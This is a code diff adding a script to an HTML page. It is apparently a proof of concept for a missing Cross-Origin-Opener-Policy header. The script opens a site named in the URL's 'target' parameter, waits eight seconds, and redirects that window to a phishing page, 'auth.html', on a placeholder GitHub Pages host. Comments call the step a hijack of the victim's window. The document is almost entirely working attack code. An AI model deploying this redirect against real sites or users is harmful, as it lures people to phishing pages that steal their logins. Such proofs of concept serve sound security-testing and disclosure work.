@@ -15,4 +15,28 @@
   <div id="msg">If the site did not automatically redirect to the target, click anywhere in the white background.</div>
 
 <script>
-  const params = new URLSearchParams(window.loca
+  const params = new URLSearchParams(window.location.search);
+  const target = params.get('target');
+  let win;
+
+  function openTarget() {
+    if (target) {
+      win = window.open(target, 'victimWindow');
+      document.getElementById('msg').style.display = 'none';
+      setTimeout(navigateAway, 8000); // wait 8s then hijack the window
+    }
+  }
+
+  function navigateAway() {
+    if (win && !win.closed) {
+      // Because COOP is missing, opener still holds a reference
+      // and can navigate the victim's window to a phishing page
+      win.location = 'https://<your-username>.github.io/<repo-name>/auth.html';
+    }
+  }
+
+  // Auto-trigger on load
+  setTimeout(openTarget, 1500);
+</script>
+</body>
+</html>
